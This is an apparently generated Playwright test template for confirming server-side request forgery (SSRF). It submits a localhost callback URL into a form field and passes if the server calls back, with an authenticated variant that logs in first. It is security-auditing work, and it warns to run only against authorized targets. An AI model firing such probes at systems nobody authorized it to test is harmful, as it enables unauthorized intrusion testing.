import { test, expect } from '@playwright/test';
import { createServer, Server } from 'http';

/**
 * SSRF Security E2E Tests
 * Generated by redteam-skills generate-e2e
 *
 * PURPOSE: PoC (Proof of Concept) verification for SSRF vulnerabilities.
 * These tests PASS when SSRF callback is received (vulnerability EXISTS).
 * Use for security auditing, not regression testing.
 *
 * WARNING: These tests attempt to trigger server-side requests.
 * Only run against authorized targets.
 */

let callbackServer: Server;
let receivedPaths: string[] = [];

test.beforeAll(async () => {
  callbackServer = createServer((req, res) => {
    receivedPaths.push(req.url || '/');
    res.writeHead(200);
    res.end('OK');
  });
  await new Promise<void>(r => callbackServer.listen({{CALLBACK_PORT}}, '127.0.0.1', r));
});

test.afterAll(async () => {
  await new Promise<void>(r => callbackServer.close(() => r()));
});

test.beforeEach(() => {
  receivedPaths = [];
});

test.describe('SSRF Security Tests', () => {
  /**
   * SSRF Test
   * Submits a callback URL and verifies if the server makes a request to it
   * If callback is received, SSRF vulnerability exists
   */
  test('{{VULN_ID}}: SSRF at {{ENDPOINT}}', async ({ page }) => {
    const callbackUrl = `http://localhost:{{CALLBACK_PORT}}/ssrf-${Date.now()}`;

    // Submit SSRF payload
    await page.goto('{{ENDPOINT}}');
    await page.fill('{{INPUT_SELECTOR}}', callbackUrl);
    await page.click('button[type="submit"]');

    // Poll for callback with early exit (Playwright best practice)
    // Test PASSES when callback is received (vulnerability EXISTS)
    await expect.poll(
      () => receivedPaths.some(p => p.includes('ssrf-')),
      { timeout: 3000, intervals: [100] }
    ).toBe(true);
  });

  /**
   * Authenticated SSRF Test
   * Logs in first, then submits SSRF payload
   * Use when the vulnerable endpoint requires authentication
   */
  test('{{VULN_ID}}: Authenticated SSRF at {{ENDPOINT}}', async ({ page }) => {
    // Login first
    await page.goto('{{AUTH_ENDPOINT}}');
    await page.fill('#email', process.env.AUTH_EMAIL || '{{AUTH_EMAIL}}');
    await page.fill('#password', process.env.AUTH_PASSWORD || '{{AUTH_PASSWORD}}');
    await page.click('button[type="submit"]');

    // Wait for authentication to complete
    await page.waitForURL((url) => !url.pathname.includes('login'), { timeout: 10000 });

    const callbackUrl = `http://localhost:{{CALLBACK_PORT}}/ssrf-auth-${Date.now()}`;

    // Submit SSRF payload
    await page.goto('{{ENDPOINT}}');
    await page.fill('{{INPUT_SELECTOR}}', callbackUrl);
    await page.click('button[type="submit"]');

    // Poll for callback with early exit (Playwright best practice)
    await expect.poll(
      () => receivedPaths.some(p => p.includes('ssrf-auth-')),
      { timeout: 3000, intervals: [100] }
    ).toBe(true);
  });
});
